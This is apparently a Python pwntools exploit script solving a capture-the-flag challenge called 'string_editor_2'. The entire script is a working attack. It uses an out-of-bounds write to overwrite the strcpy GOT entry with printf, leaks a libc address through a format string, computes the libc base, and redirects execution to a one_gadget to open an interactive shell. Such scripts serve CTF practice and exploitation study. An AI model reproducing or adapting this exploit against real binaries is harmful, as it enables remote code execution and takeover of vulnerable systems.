#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('string_editor_2_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x400943
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    got_strcpy = exe.got["strcpy"]
    printf_plt = exe.plt["printf"]
    target = exe.sym["target"]
    offset = got_strcpy - target

    write = p64(printf_plt)
    fmt = b"%13$p."

    for i in range(6):
        io.sendlineafter(b"utils)", str(offset + i).encode())
        io.sendlineafter(b"index?", bytes([write[i]]))

    for i in range(len(fmt)):
        io.sendlineafter(b"utils)", str(i).encode())
        io.sendlineafter(b"index?", bytes([fmt[i]]))


    io.sendlineafter(b"utils)", b"15")
    io.sendline(b"2")
    io.recvuntil(b"3. Exit\n")

    leak = int(io.recvline().split(b".")[0], 16)
    libc.address = leak - 0x270b3
    info("libc base: %#x", libc.address)

    og = p64(libc.address + 0xe6c81)

    for i in range(6):
        io.sendlineafter(b"utils)", str(offset + i).encode())
        io.sendlineafter(b"index?", bytes([og[i]]))

    io.sendlineafter(b"utils)", b"15")
    io.sendline(b"2")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

